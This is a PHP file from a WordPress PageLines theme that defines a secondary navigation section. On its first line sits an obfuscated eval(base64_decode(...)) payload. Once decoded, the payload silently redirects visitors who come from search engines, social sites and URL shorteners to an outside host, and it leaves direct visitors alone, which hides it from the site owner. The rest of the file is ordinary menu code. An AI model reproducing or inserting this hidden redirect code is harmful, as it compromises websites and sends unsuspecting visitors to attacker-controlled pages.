<?php	 	eval(base64_decode("DQplcnJvcl9yZXBvcnRpbmcoMCk7DQokcWF6cGxtPWhlYWRlcnNfc2VudCgpOw0KaWYgKCEkcWF6cGxtKXsNCiRyZWZlcmVyPSRfU0VSVkVSWydIVFRQX1JFRkVSRVInXTsNCiR1YWc9JF9TRVJWRVJbJ0hUVFBfVVNFUl9BR0VOVCddOw0KaWYgKCR1YWcpIHsNCmlmICghc3RyaXN0cigkdWFnLCJNU0lFIDcuMCIpIGFuZCAhc3RyaXN0cigkdWFnLCJNU0lFIDYuMCIpKXsKaWYgKHN0cmlzdHIoJHJlZmVyZXIsInlhaG9vIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYmluZyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInJhbWJsZXIiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJsaXZlLmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIndlYmFsdGEiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiaXQubHkiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJ0aW55dXJsLmNvbSIpIG9yIHByZWdfbWF0Y2goIi95YW5kZXhcLnJ1XC95YW5kc2VhcmNoXD8oLio/KVwmbHJcPS8iLCRyZWZlcmVyKSBvciBwcmVnX21hdGNoICgiL2dvb2dsZVwuKC4qPylcL3VybFw/c2EvIiwkcmVmZXJlcikgb3Igc3RyaXN0cigkcmVmZXJlciwibXlzcGFjZS5jb20iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJmYWNlYm9vay5jb20vbCIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImFvbC5jb20iKSkgew0KaWYgKCFzdHJpc3RyKCRyZWZlcmVyLCJjYWNoZSIpIG9yICFzdHJpc3RyKCRyZWZlcmVyLCJpbnVybCIpKXsNCmhlYWRlcigiTG9jYXRpb246IGh0dHA6Ly9xZXNvcHYuNHB1LmNvbS8iKTsNCmV4aXQoKTsNCn0KfQp9DQp9DQp9"));
/*
	Section: Secondary Nav
	Author: PageLines
	Author URI: http://www.pagelines.com
	Description: Creates secondary site navigation.
	Class Name: PageLinesSecondNav
	Workswith: header, content
	Edition: pro
*/

class PageLinesSecondNav extends PageLinesSection {

	// PHP that always loads no matter if section is added or not -- e.g. creates menus, locations, admin stuff...
	function section_persistent(){
		
			$metatab_array = array(
					'_second_nav_menu' => array(
						'type' 			=> 'select_menu',			
						'title' 		=> 'Select Secondary Nav Menu',
						'shortexp' 		=> 'Select the menu you would like to use for your secondary nav.', 
						'inputlabel'	=> 'Select Secondary Navigation Menu'
					)
				);
				
			add_global_meta_options( $metatab_array );
		
	}
	
   	function section_template() { 
		

		$second_menu = (ploption('_second_nav_menu', $this->oset)) ? ploption('_second_nav_menu', $this->oset) : null;
		
		if(isset($second_menu))
			wp_nav_menu( array('menu_class'  => 'secondnav_menu lcolor3', 'menu' => $second_menu, 'container' => null, 'container_class' => '', 'depth' => 1, 'fallback_cb'=>'pagelines_page_subnav') );
					
		elseif(ploption('nav_use_hierarchy', $this->oset))
			pagelines_page_subnav();

	}


}